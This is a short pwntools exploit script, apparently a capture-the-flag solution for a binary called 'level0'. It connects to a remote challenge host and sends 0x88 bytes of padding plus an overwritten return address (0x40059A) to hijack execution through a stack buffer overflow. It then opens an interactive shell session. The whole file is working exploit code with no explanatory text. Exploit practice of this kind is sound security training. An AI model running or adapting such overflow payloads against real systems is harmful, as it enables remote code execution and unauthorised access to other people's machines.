from pwn import *

# sh = process("./level0")
sh = remote("61.147.171.105", 65320)

sh.recv()
payload = b'a' * 0x88 + p64(0x40059A)
sh.sendline(payload)
sh.interactive()